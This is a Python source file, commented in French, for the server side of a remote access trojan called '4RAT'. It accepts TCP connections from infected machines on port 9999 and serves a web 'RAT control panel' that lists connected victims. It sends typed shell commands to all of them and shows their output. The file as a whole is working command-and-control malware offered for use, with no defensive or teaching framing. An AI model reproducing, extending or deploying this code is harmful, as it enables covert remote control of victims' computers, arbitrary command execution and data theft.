import socket
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit

ratip = "172.18.22.140" # change selon ton ip locale
ratport = 9999 # change si tu veux

srvip = "0.0.0.0" # change selon ton ip locale (ou garder comme sa si tu veux garder le panel en locale)
srvport = 5000 # change si tu veux

app = Flask(__name__)
socketio = SocketIO(app)

clients = []

@app.route('/')
def index():
    return '''
    <!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>4RAT</title>
    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
    <style>
        @keyframes rainbow {

            100%,
            0% {
                color: rgb(255, 0, 0);
            }

            8% {
                color: rgb(255, 127, 0);
            }

            16% {
                color: rgb(255, 255, 0);
            }

            25% {
                color: rgb(127, 255, 0);
            }

            33% {
                color: rgb(0, 255, 0);
            }

            41% {
                color: rgb(0, 255, 127);
            }

            50% {
                color: rgb(0, 255, 255);
            }

            58% {
                color: rgb(0, 127, 255);
            }

            66% {
                color: rgb(0, 0, 255);
            }

            75% {
                color: rgb(127, 0, 255);
            }

            83% {
                color: rgb(255, 0, 255);
            }

            91% {
                color: rgb(255, 0, 127);
            }
        }

        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap');

        button,
        input {
            background-color: black;
        }

        * {
            color: white;
            font-family: "JetBrains Mono", monospace;
            font-weight: 10;
            font-style: normal;
        }
        
        #title {
            text-align: center;
        }

        #ra {
            animation: rainbow 2s .5s infinite ease-in;
        }

        html {
            background-color: black;
        }
    </style>
</head>

<body>
    <h1 id="title"><span id="ra">4</span>RAT control panel</h1>
    <h1>Connected Clients</h1>
    <ul id="clients"></ul>
    <h2>Command Input</h2>
    <input type="text" id="command" placeholder="Enter command">
    <button onclick="sendCommand()">Send Command</button>
    <h2>Command Output</h2>
    <pre id="output"></pre>

    <script>
        const socket = io();

        socket.on('client_update', (data) => {
            const clientList = document.getElementById('clients');
            clientList.innerHTML = '';
            data.clients.forEach((client) => {
                const listItem = document.createElement('li');
                listItem.textContent = client.address;
                clientList.appendChild(listItem);
            });
        });

        function sendCommand() {
            const command = document.getElementById('command').value;
            document.getElementById('output').textContent = '';  // Clear previous output
            socket.emit('send_command', { command });
        }

        socket.on('command_output', (data) => {
            document.getElementById('output').textContent += data.output;  // Append output
        });
    </script>
</body>

</html>
    '''

@socketio.on('connect')
def handle_web_connect():
    emit('client_update', {'clients': [{'id': i, 'address': client[1]} for i, client in enumerate(clients)]})

@socketio.on('send_command')
def handle_send_command(data):
    command = data['command']
    
    for client_socket, addr in clients:
        try:
            client_socket.sendall(f"{command}\n".encode())
            output = client_socket.recv(4096).decode()
            emit('command_output', {'output': output}, broadcast=True)
        except Exception as e:
            emit('command_output', {'output': f"Error executing command: {e}"})

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ratip, ratport))
    server.listen(5)
    print("Listening on port 9999...")

    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        clients.append((client_socket, addr))
        socketio.emit('client_update', {'clients': [{'id': i, 'address': client[1]} for i, client in enumerate(clients)]})

if __name__ == "__main__":
    from threading import Thread
    server_thread = Thread(target=start_server)
    server_thread.start()
    socketio.run(app, host=srvip, port=srvport)
